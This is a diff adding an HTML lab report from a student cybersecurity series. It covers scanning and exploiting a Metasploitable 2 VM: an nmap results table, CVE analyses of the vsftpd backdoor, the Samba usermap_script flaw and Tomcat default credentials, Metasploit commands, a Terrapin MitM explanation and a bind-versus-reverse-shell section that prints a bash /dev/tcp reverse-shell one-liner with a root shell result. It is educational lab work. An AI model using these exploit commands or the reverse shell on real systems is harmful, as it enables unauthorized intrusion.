+    <div class="panel-title" style="font-family:var(--font-head);font-size:13px;color:var(--green);letter-spacing:2px;margin-bottom:16px;">PORT &amp; SERVICE ENUMERATION RESULTS</div>
+    <div style="overflow-x:auto;">
+      <table class="port-table">
+        <thead>
+          <tr>
+            <th>PORT</th>
+            <th>SERVICE</th>
+            <th>STATE</th>
+            <th>VERSION / BANNER</th>
+            <th>RISK</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td data-label="PORT">21/tcp</td>
+            <td data-label="SERVICE">FTP</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">vsftpd 2.3.4</td>
+            <td data-label="RISK"><span class="risk critical">CRITICAL</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">22/tcp</td>
+            <td data-label="SERVICE">SSH</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">OpenSSH 4.7p1</td>
+            <td data-label="RISK"><span class="risk high">HIGH</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">23/tcp</td>
+            <td data-label="SERVICE">Telnet</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">Linux telnetd</td>
+            <td data-label="RISK"><span class="risk critical">CRITICAL</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">25/tcp</td>
+            <td data-label="SERVICE">SMTP</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">Postfix smtpd</td>
+            <td data-label="RISK"><span class="risk medium">MEDIUM</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">53/tcp</td>
+            <td data-label="SERVICE">DNS</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">ISC BIND 9.4.2</td>
+            <td data-label="RISK"><span class="risk medium">MEDIUM</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">80/tcp</td>
+            <td data-label="SERVICE">HTTP</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">Apache httpd 2.2.8</td>
+            <td data-label="RISK"><span class="risk high">HIGH</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">139/tcp</td>
+            <td data-label="SERVICE">NetBIOS-SSN</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">Samba 3.X</td>
+            <td data-label="RISK"><span class="risk critical">CRITICAL</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">443/tcp</td>
+            <td data-label="SERVICE">HTTPS</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">Apache httpd 2.2.8</td>
+            <td data-label="RISK"><span class="risk medium">MEDIUM</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">445/tcp</td>
+            <td data-label="SERVICE">Microsoft-DS</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">Samba 3.0.20</td>
+            <td data-label="RISK"><span class="risk critical">CRITICAL</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">3306/tcp</td>
+            <td data-label="SERVICE">MySQL</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">MySQL 5.0.51a</td>
+            <td data-label="RISK"><span class="risk high">HIGH</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">5432/tcp</td>
+            <td data-label="SERVICE">PostgreSQL</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">PostgreSQL 8.3.0</td>
+            <td data-label="RISK"><span class="risk high">HIGH</span></td>
+          </tr>
+          <tr>
+            <td data-label="PORT">8180/tcp</td>
+            <td data-label="SERVICE">HTTP-Proxy</td>
+            <td data-label="STATE">open</td>
+            <td data-label="VERSION">Apache Tomcat/Coyote</td>
+            <td data-label="RISK"><span class="risk high">HIGH</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="terminal-wrap reveal" style="margin-top:32px;">
+    <div class="terminal-label">NMAP — FULL SCAN OUTPUT</div>
+    <div class="terminal-box">
+      <div class="terminal-titlebar">
+        <span class="t-dot t-red"></span><span class="t-dot t-yel"></span><span class="t-dot t-grn"></span>
+        <span class="t-title">root@kali: ~# nmap scan — 192.168.56.101</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-line"><span class="t-prompt">root@kali:~# </span><span class="t-cmd">nmap -sV -sC -O -p 21,22,23,80,139,445,3306,8180 192.168.56.101</span></span>
+<span class="t-line"><span class="t-out">Starting Nmap 7.94 ( https://nmap.org )</span></span>
+<span class="t-line"><span class="t-out">Nmap scan report for 192.168.56.101</span></span>
+<span class="t-line"><span class="t-out">PORT      STATE  SERVICE      VERSION</span></span>
+<span class="t-line"><span class="t-out">────────  ─────  ───────────  ──────────────────────────────────</span></span>
+<span class="t-line"><span class="t-crit">21/tcp    open   ftp          vsftpd 2.3.4        ← CRITICAL CVE-2011-2523</span></span>
+<span class="t-line"><span class="t-high">22/tcp    open   ssh          OpenSSH 4.7p1</span></span>
+<span class="t-line"><span class="t-crit">23/tcp    open   telnet       Linux telnetd        ← CRITICAL plaintext auth</span></span>
+<span class="t-line"><span class="t-high">80/tcp    open   http         Apache httpd 2.2.8</span></span>
+<span class="t-line"><span class="t-crit">139/tcp   open   netbios-ssn  Samba smbd 3.X       ← CRITICAL CVE-2007-2447</span></span>
+<span class="t-line"><span class="t-crit">445/tcp   open   microsoft-ds Samba smbd 3.0.20    ← CRITICAL RCE</span></span>
+<span class="t-line"><span class="t-high">3306/tcp  open   mysql        MySQL 5.0.51a</span></span>
+<span class="t-line"><span class="t-high">8180/tcp  open   http         Apache Tomcat 5.5    ← HIGH default creds</span></span>
+<span class="t-line"> </span>
+<span class="t-line"><span class="t-warn">OS: Linux 2.6.x — Metasploitable 2 (intentionally vulnerable)</span></span>
+<span class="t-line"><span class="t-success">Nmap done — 4 CRITICAL findings, 4 HIGH findings. Full report: scan_results.txt</span></span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ─── CVE ─── -->
+<section id="cve">
+  <div class="section-header reveal">
+    <div class="section-num">// 04</div>
+    <h2 class="section-title">CVE Research <span>&amp; Risk Analysis</span></h2>
+    <div class="section-line"></div>
+  </div>
+
+  <!-- CVE 1 -->
+  <div class="cve-card reveal">
+    <div class="pending-num">01</div>
+    <div class="cve-header">
+      <div>
+        <div class="cve-id">CVE-2011-2523</div>
+        <div class="cve-title">vsftpd 2.3.4 Backdoor — FTP Port 21</div>
+      </div>
+      <div class="cve-score">10.0</div>
+    </div>
+    <p style="color:#a8c8b0;font-size:15px;margin-bottom:16px;">A backdoor was introduced into vsftpd version 2.3.4 via a malicious actor who tampered with the official source tarball. When a username containing a smiley face ":)" is submitted, the daemon spawns a root shell on TCP port 6200.</p>
+    <div style="margin-bottom:12px;font-family:var(--font-head);font-size:11px;color:var(--red);letter-spacing:2px;">HYPOTHETICAL ATTACK SCENARIO</div>
+    <ul class="scenario-steps">
+      <li><span class="step-num">1</span>Attacker connects to port 21 and sends username "user:)" with any password.</li>
+      <li><span class="step-num">2</span>vsftpd 2.3.4 opens a command shell on port 6200.</li>
+      <li><span class="step-num">3</span>Attacker connects to port 6200 and receives a root shell.</li>
+      <li><span class="step-num">4</span>Full system compromise achieved without any credential or brute-force.</li>
+    </ul>
+    <div class="code-block"><span class="code-cmd">nmap -p 6200 192.168.56.101 --script ftp-vsftpd-backdoor</span></div>
+  </div>
+
+  <!-- CVE 2 -->
+  <div class="cve-card reveal">
+    <div class="pending-num">02</div>
+    <div class="cve-header">
+      <div>
+        <div class="cve-id">CVE-2007-2447</div>
+        <div class="cve-title">Samba 3.0.20 Username Map Script — Ports 445/139</div>
+      </div>
+      <div class="cve-score">9.3</div>
+    </div>
+    <p style="color:#a8c8b0;font-size:15px;margin-bottom:16px;">A command injection vulnerability in Samba's MS-RPC functionality. User-supplied input is passed directly to the shell without sanitization, allowing remote unauthenticated code execution as root.</p>
+    <div style="margin-bottom:12px;font-family:var(--font-head);font-size:11px;color:var(--red);letter-spacing:2px;">METASPLOIT MODULE</div>
+    <div class="code-block">
+<span class="code-cmd">use exploit/multi/samba/usermap_script</span>
+<span class="code-cmd">set RHOSTS 192.168.56.101</span>
+<span class="code-cmd">set PAYLOAD cmd/unix/reverse_netcat</span>
+<span class="code-cmd">exploit</span>
+    </div>
+  </div>
+
+  <!-- CVE 3 -->
+  <div class="cve-card reveal">
+    <div class="pending-num">03</div>
+    <div class="cve-header">
+      <div>
+        <div class="cve-id">CVE-2009-3548</div>
+        <div class="cve-title">Apache Tomcat Weak Credentials / Manager RCE — Port 8180</div>
+      </div>
+      <div class="cve-score">7.5</div>
+    </div>
+    <p style="color:#a8c8b0;font-size:15px;margin-bottom:16px;">Apache Tomcat deployed on Metasploitable uses default credentials (tomcat/tomcat) for the /manager/html interface. An attacker can upload a malicious WAR file containing a JSP webshell, achieving RCE.</p>
+    <ul class="scenario-steps">
+      <li><span class="step-num">1</span>Navigate to http://192.168.56.101:8180/manager/html</li>
+      <li><span class="step-num">2</span>Default credentials tomcat:tomcat are accepted.</li>
+      <li><span class="step-num">3</span>Craft a WAR file using msfvenom containing a reverse shell payload.</li>
+      <li><span class="step-num">4</span>Upload &amp; deploy via the manager interface — trigger to get shell access.</li>
+    </ul>
+  </div>
+
+  <div class="terminal-wrap reveal">
+    <div class="terminal-label">CVE LOOKUP — searchsploit &amp; msfconsole</div>
+    <div class="terminal-box">
+      <div class="terminal-titlebar">
+        <span class="t-dot t-red"></span><span class="t-dot t-yel"></span><span class="t-dot t-grn"></span>
+        <span class="t-title">root@kali: ~# searchsploit / msfconsole</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-line"><span class="t-prompt">root@kali:~# </span><span class="t-cmd">searchsploit vsftpd 2.3.4</span></span>
+<span class="t-line"><span class="t-out">─────────────────────────────────────────────────────────────────</span></span>
+<span class="t-line"><span class="t-crit"> vsftpd 2.3.4 - Backdoor Command Execution    | unix/remote/17491.rb</span></span>
+<span class="t-line"><span class="t-out">─────────────────────────────────────────────────────────────────</span></span>
+<span class="t-line"> </span>
+<span class="t-line"><span class="t-prompt">root@kali:~# </span><span class="t-cmd">searchsploit samba 3.0.20</span></span>
+<span class="t-line"><span class="t-crit"> Samba 3.0.20 &lt; 3.0.25rc3 - Username Map RCE  | unix/remote/16320.rb</span></span>
+<span class="t-line"> </span>
+<span class="t-line"><span class="t-prompt">root@kali:~# </span><span class="t-cmd">msfconsole -q</span></span>
+<span class="t-line"><span class="t-success">       =[ metasploit v6.3.44 — 2373 exploits, 1397 payloads ]</span></span>
+<span class="t-line"><span class="t-out">msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor</span></span>
+<span class="t-line"><span class="t-out">msf6 exploit(vsftpd_234_backdoor) &gt; set RHOSTS 192.168.56.101</span></span>
+<span class="t-line"><span class="t-out">msf6 exploit(vsftpd_234_backdoor) &gt; check</span></span>
+<span class="t-line"><span class="t-success">[+] 192.168.56.101:21 — The target is vulnerable! CVSS Score: 10.0</span></span>
+<span class="t-line"><span class="t-prompt">msf6 &gt; </span><span class="t-cursor"></span></span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ─── CTF ─── -->
+<section id="ctf">
+  <div class="bg-accent" style="width:400px;height:300px;background:rgba(0,212,255,0.04);top:50%;right:-100px;"></div>
+  <div class="section-header reveal">
+    <div class="section-num">// 05</div>
+    <h2 class="section-title">CTF Reconnaissance <span>Pipeline</span></h2>
+    <div class="section-line"></div>
+  </div>
+
+  <div style="overflow-x:auto;" class="reveal">
+    <table class="ctf-table">
+      <thead>
+        <tr>
+          <th>CTF STAGE</th>
+          <th>LAB ACTIVITY</th>
+          <th>OUTCOME IN CTF CONTEXT</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>RECON</td>
+          <td>Nmap port scan</td>
+          <td>Identify attack vectors before attempting exploits</td>
+        </tr>
+        <tr>
+          <td>ENUMERATION</td>
+          <td>Service version detection (-sV)</td>
+          <td>Narrow down specific CVEs for each service</td>
+        </tr>
+        <tr>
+          <td>CVE RESEARCH</td>
+          <td>NVD / Mitre lookup</td>
+          <td>Confirm exploitability before investing time</td>
+        </tr>
+        <tr>
+          <td>PRIORITIZATION</td>
+          <td>Risk level classification</td>
+          <td>Target Critical/High findings first for flags</td>
+        </tr>
+        <tr>
+          <td>PIVOT PLANNING</td>
+          <td>Identify internal services</td>
+          <td>Plan lateral movement from initial foothold</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ─── PENDING ─── -->
+<section id="pending">
+  <div class="section-header reveal">
+    <div class="section-num">// 06</div>
+    <h2 class="section-title">Pending Research <span>Topics</span></h2>
+    <div class="section-line"></div>
+  </div>
+
+  <!-- Terrapin -->
+  <div class="pending-card reveal">
+    <div class="pending-num">6.1</div>
+    <div class="pending-title">THE TERRAPIN ATTACK (CVE-2023-48795)</div>
+    <p style="color:#a8c8b0;margin-bottom:16px;">A prefix truncation attack targeting the SSH Binary Packet Protocol (SSH-BPP), discovered in December 2023 by researchers at Ruhr University Bochum. Targets the handshake phase directly — no authentication required.</p>
+    <div class="code-block">
+<span class="code-comment"># Technical mechanism flow:</span>
+Client ──[KEXINIT]──&gt; MitM ──[KEXINIT + injected]──&gt; Server
+MitM deletes ext-info-s and ping@openssh.com markers
+Server accepts degraded capabilities without detecting tampering
+    </div>
+    <div class="panel" style="margin-top:16px;">
+      <div class="panel-title">MITIGATION</div>
+      <p style="font-size:14px;color:#a8c8b0;">Update OpenSSH to version 9.6+ (implements "strict KEX" countermeasure). Disable vulnerable cipher suites (chacha20-poly1305, CTR/CBC with encrypt-then-MAC). Use network segmentation to reduce MitM exposure.</p>
+    </div>
+
+    <div class="terminal-wrap" style="margin-top:24px;">
+      <div class="terminal-label">TERRAPIN — MitM SSH INTERCEPT FLOW</div>
+      <div class="terminal-box">
+        <div class="terminal-titlebar">
+          <span class="t-dot t-red"></span><span class="t-dot t-yel"></span><span class="t-dot t-grn"></span>
+          <span class="t-title">attacker@mitm — CVE-2023-48795</span>
+        </div>
+        <div class="terminal-body">
+<span class="t-line"><span class="t-warn">[*] MitM positioned between Client (192.168.1.10) and Server (192.168.1.20)</span></span>
+<span class="t-line"><span class="t-out">CLIENT ─────────────────────────────────────────────────── SERVER</span></span>
+<span class="t-line"><span class="t-info">  Client  ──[SSH_MSG_KEXINIT]─────────────────────────&gt;  Server</span></span>
+<span class="t-line"><span class="t-info">  Client  &lt;─[SSH_MSG_KEXINIT]─────────────────────────   Server</span></span>
+<span class="t-line"><span class="t-warn">  MitM    ── DELETING: ext-info-s ─────────────────────&gt;  Server</span></span>
+<span class="t-line"><span class="t-warn">  MitM    ── DELETING: ping@openssh.com ───────────────&gt;  Server</span></span>
+<span class="t-line"><span class="t-out">───────────────────────────────────────────────────────────────</span></span>
+<span class="t-line"><span class="t-crit">[!] Server accepted degraded KEX — tampering undetected</span></span>
+<span class="t-line"><span class="t-crit">[!] Keystroke timing obfuscation: DISABLED</span></span>
+<span class="t-line"><span class="t-crit">[!] Security extensions: DOWNGRADED</span></span>
+<span class="t-line"><span class="t-success">[✓] Fix: Upgrade OpenSSH to 9.6+ (strict-kex countermeasure)</span></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MSF Payloads -->
+  <div class="pending-card reveal">
+    <div class="pending-num">6.2</div>
+    <div class="pending-title">AUTO PAYLOAD RECOMMENDATION IN METASPLOIT</div>
+    <p style="color:#a8c8b0;margin-bottom:16px;">Metasploit recommends payloads automatically based on platform compatibility, architecture, payload space, BadChars, and reliability ranking — all defined in each module's Ruby metadata block.</p>
+    <div class="code-block">
+<span class="code-comment"># Example from exploit/multi/samba/usermap_script</span>
+<span class="code-cmd">'DefaultOptions' =&gt; { 'EXITFUNC' =&gt; 'thread' },</span>
+<span class="code-cmd">'Platform'       =&gt; 'unix',</span>
+<span class="code-cmd">'Arch'           =&gt; ARCH_CMD,</span>
+<span class="code-cmd">'Payload'        =&gt; { 'Space' =&gt; 1024, 'BadChars' =&gt; '' }</span>
+    </div>
+
+    <div class="compare-grid">
+      <div class="compare-col bind">
+        <div class="compare-head">STAGED PAYLOAD</div>
+        <div class="compare-item"><span class="compare-dot"></span>Small initial stager sent to target</div>
+        <div class="compare-item"><span class="compare-dot"></span>Downloads full payload from handler</div>
+        <div class="compare-item"><span class="compare-dot"></span>Requires network connectivity back</div>
+        <div class="compare-item"><span class="compare-dot"></span>Auto-recommended for tight payload space</div>
+      </div>
+      <div class="compare-col reverse">
+        <div class="compare-head">STAGELESS PAYLOAD</div>
+        <div class="compare-item"><span class="compare-dot"></span>Entire payload embedded in exploit</div>
+        <div class="compare-item"><span class="compare-dot"></span>Self-contained — no download needed</div>
+        <div class="compare-item"><span class="compare-dot"></span>More reliable on unstable connections</div>
+        <div class="compare-item"><span class="compare-dot"></span>Auto-recommended when payload space is large</div>
+      </div>
+    </div>
+
+    <div class="terminal-wrap" style="margin-top:24px;">
+      <div class="terminal-label">METASPLOIT CONSOLE — PAYLOAD SELECTION</div>
+      <div class="terminal-box">
+        <div class="terminal-titlebar">
+          <span class="t-dot t-red"></span><span class="t-dot t-yel"></span><span class="t-dot t-grn"></span>
+          <span class="t-title">msf6 &gt; exploit/multi/samba/usermap_script</span>
+        </div>
+        <div class="terminal-body">
+<span class="t-line"><span class="t-success">       =[ metasploit v6.3.44 — 2373 exploits / 1397 payloads ]</span></span>
+<span class="t-line"><span class="t-out">msf6 &gt; use exploit/multi/samba/usermap_script</span></span>
+<span class="t-line"><span class="t-out">msf6 exploit(usermap_script) &gt; show payloads</span></span>
+<span class="t-line"><span class="t-out">   #   Name                          Rank    Notes</span></span>
+<span class="t-line"><span class="t-out">   ─   ────                          ────    ─────────────────────────</span></span>
+<span class="t-line"><span class="t-high">   0   cmd/unix/bind_netcat          normal  Target opens listener</span></span>
+<span class="t-line"><span class="t-success">   1   cmd/unix/reverse_netcat       normal  ← AUTO SELECTED (default)</span></span>
+<span class="t-line"><span class="t-high">   2   cmd/unix/reverse_bash         normal  Bash built-in /dev/tcp</span></span>
+<span class="t-line"><span class="t-info">[*] Auto-selection factors: Platform=unix, Arch=CMD, Space=1024B, BadChars=none</span></span>
+<span class="t-line"><span class="t-out">msf6 exploit(usermap_script) &gt; set RHOSTS 192.168.56.101</span></span>
+<span class="t-line"><span class="t-out">msf6 exploit(usermap_script) &gt; set LHOST 192.168.56.100</span></span>
+<span class="t-line"><span class="t-out">msf6 exploit(usermap_script) &gt; exploit</span></span>
+<span class="t-line"><span class="t-success">[+] Command shell session 1 opened — uid=0(root)</span></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bind vs Reverse -->
+  <div class="pending-card reveal">
+    <div class="pending-num">6.3</div>
+    <div class="pending-title">BIND SHELL vs. REVERSE SHELL</div>
+    <p style="color:#a8c8b0;margin-bottom:16px;">Two paradigms for establishing shell sessions after exploitation. Choice depends entirely on network topology, firewall posture, and visibility requirements.</p>
+
+    <div class="compare-grid">
+      <div class="compare-col bind">
+        <div class="compare-head">USE BIND SHELL WHEN…</div>
+        <div class="compare-item"><span class="compare-dot"></span>Attacker IP is dynamic or behind NAT</div>
+        <div class="compare-item"><span class="compare-dot"></span>Target has a static, reachable IP/port</div>
+        <div class="compare-item"><span class="compare-dot"></span>Outbound traffic from target is blocked</div>
+        <div class="compare-item"><span class="compare-dot"></span>Internal lab / same-subnet scenario</div>
+      </div>
+      <div class="compare-col reverse">
+        <div class="compare-head">USE REVERSE SHELL WHEN…</div>
+        <div class="compare-item"><span class="compare-dot"></span>Target is behind NAT/firewall (common case)</div>
+        <div class="compare-item"><span class="compare-dot"></span>Target allows outbound HTTP/HTTPS traffic</div>
+        <div class="compare-item"><span class="compare-dot"></span>Real-world pentest engagements</div>
+        <div class="compare-item"><span class="compare-dot"></span>Metasploit meterpreter sessions</div>
+      </div>
+    </div>
+
+    <div class="code-block" style="margin-top:20px;">
+<span class="code-comment"># MSF naming convention</span>
+<span class="code-cmd">windows/meterpreter/reverse_tcp</span>   <span class="code-comment">→ Target connects OUT to attacker</span>
+<span class="code-cmd">windows/meterpreter/bind_tcp</span>      <span class="code-comment">→ Attacker connects IN to target</span>
+<span class="code-cmd">cmd/unix/reverse_netcat</span>           <span class="code-comment">→ Reverse shell using netcat</span>
+<span class="code-cmd">cmd/unix/bind_netcat</span>              <span class="code-comment">→ Bind shell using netcat</span>
+    </div>
+
+    <div class="note" style="margin-top:16px;">
+      <span class="note-icon">★</span>
+      <span class="note-text">RULE OF THUMB: Default to Reverse Shell in all real engagements. Use Bind Shell only when the target has an exposed port and your machine cannot receive inbound connections.</span>
+    </div>
+
+    <div class="terminal-wrap" style="margin-top:24px;">
+      <div class="terminal-label">REVERSE SHELL — NETCAT LISTENER + PAYLOAD</div>
+      <div class="terminal-box">
+        <div class="terminal-titlebar">
+          <span class="t-dot t-red"></span><span class="t-dot t-yel"></span><span class="t-dot t-grn"></span>
+          <span class="t-title">attacker@kali — nc listener + reverse shell delivery</span>
+        </div>
+        <div class="terminal-body">
+<span class="t-line"><span class="t-out">── ATTACKER: set up listener first ──────────────────────────────</span></span>
+<span class="t-line"><span class="t-prompt">root@kali:~# </span><span class="t-cmd">nc -lvnp 4444</span></span>
+<span class="t-line"><span class="t-info">Listening on 0.0.0.0:4444 ...</span></span>
+<span class="t-line"> </span>
+<span class="t-line"><span class="t-out">── TARGET: payload injected via CVE-2007-2447 (Samba) ───────────</span></span>
+<span class="t-line"><span class="t-cmd">bash -i &gt;&amp; /dev/tcp/192.168.56.100/4444 0&gt;&amp;1</span></span>
+<span class="t-line"> </span>
+<span class="t-line"><span class="t-out">── ATTACKER: connection received ────────────────────────────────</span></span>
+<span class="t-line"><span class="t-success">Connection received on 192.168.56.101:41337</span></span>
+<span class="t-line"><span class="t-crit">root@metasploitable:/# id</span></span>
+<span class="t-line"><span class="t-crit">uid=0(root) gid=0(root) groups=0(root)</span></span>
+<span class="t-line"><span class="t-warn">[!] Full system compromise — ROOT SHELL confirmed via reverse connection</span></span>
+<span class="t-line"><span class="t-crit">root@metasploitable:/# </span><span class="t-cursor"></span></span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ─── SUMMARY ─── -->
+<section id="summary">
+  <div class="section-header reveal">
+    <div class="section-num">// 07</div>
+    <h2 class="section-title">Deliverables <span>&amp; Summary</span></h2>
+    <div class="section-line"></div>
+  </div>
+
+  <ul class="deliverable-list reveal">
+    <li><span class="del-icon">01</span>Nmap scan output file: scan_results.txt (saved on attacker VM)</li>
+    <li><span class="del-icon">02</span>Port-service-risk table (Section 3.2)</li>
+    <li><span class="del-icon">03</span>Three CVE-backed hypothetical risk analyses</li>
+    <li><span class="del-icon">04</span>CTF reconnaissance mapping table (Section 5)</li>
+    <li><span class="del-icon">05</span>Foundational research notes on three pending advanced topics</li>
+  </ul>
+
+  <br><br>
+
+  <div class="status-row reveal">
+    <div class="status-cell">
+      <div class="status-concept">Nmap Port Scanning</div>
+      <div><span class="status-badge done">✓ COMPLETED</span></div>
+      <div class="status-next">→ Practice with -sU (UDP scans)</div>
+    </div>
+    <div class="status-cell">
+      <div class="status-concept">CVE Research</div>
+      <div><span class="status-badge done">✓ COMPLETED</span></div>
+      <div class="status-next">→ Automate with searchsploit</div>
+    </div>
+    <div class="status-cell">
+      <div class="status-concept">Metasploitable Setup</div>
+      <div><span class="status-badge done">✓ COMPLETED</span></div>
+      <div class="status-next">→ Use for Day 2 exploitation</div>
+    </div>
+  </div>
+
+  <div class="status-row reveal">
+    <div class="status-cell">
+      <div class="status-concept">Terrapin Attack</div>
+      <div><span class="status-badge pending">⏳ PENDING</span></div>
+      <div class="status-next">→ Set up MitM lab environment</div>
+    </div>
+    <div class="status-cell">
+      <div class="status-concept">MSF Auto-Payloads</div>
+      <div><span class="status-badge pending">⏳ PENDING</span></div>
+      <div class="status-next">→ Explore module source code</div>
+    </div>
+    <div class="status-cell">
+      <div class="status-concept">Bind vs Reverse Shell</div>
+      <div><span class="status-badge pending">⏳ PENDING</span></div>
+      <div class="status-next">→ Lab: practice both in VM</div>
+    </div>
+  </div>
+
+  <div class="panel reveal" style="margin-top:32px;">
+    <div class="panel-title">REFERENCES</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin-top:8px;">
+      <div style="font-family:var(--font-mono);font-size:12px;color:rgba(200,230,208,0.55);">NIST NVD — nvd.nist.gov</div>
+      <div style="font-family:var(--font-mono);font-size:12px;color:rgba(200,230,208,0.55);">CVE-2011-2523 — Mitre CVE</div>
+      <div style="font-family:var(--font-mono);font-size:12px;color:rgba(200,230,208,0.55);">CVE-2007-2447 — Mitre CVE</div>
+      <div style="font-family:var(--font-mono);font-size:12px;color:rgba(200,230,208,0.55);">CVE-2023-48795 — Ruhr University Bochum</div>
+      <div style="font-family:var(--font-mono);font-size:12px;color:rgba(200,230,208,0.55);">docs.metasploit.com</div>
+      <div style="font-family:var(--font-mono);font-size:12px;color:rgba(200,230,208,0.55);">nmap.org/book/man.html</div>
+    </div>
+  </div>
+</section>
+
+<!-- ─── FOOTER ─── -->
+<footer>
+  <div class="footer-logo">CYBERSECURITY LAB SERIES — DAY 1</div>
+  <div class="footer-names">Md. Abdullah Ibna Shad &amp; Abdur Rafiu<br>
+    <span style="color:rgba(200,230,208,0.3);font-size:11px;">This document is produced for educational purposes in a controlled, authorized lab environment.</span>
+  </div>
+</footer>
+
+<script>
+  // Progress bar
+  window.addEventListener('scroll', () => {
+    const scrollTop = document.documentElement.scrollTop;
+    const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+    document.getElementById('progress').style.width = (scrollTop / scrollHeight * 100) + '%';
+  });
+
+  // Scroll reveal
+  const reveals = document.querySelectorAll('.reveal');
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) e.target.classList.add('visible');
+    });
+  }, { threshold: 0.1 });
+  reveals.forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
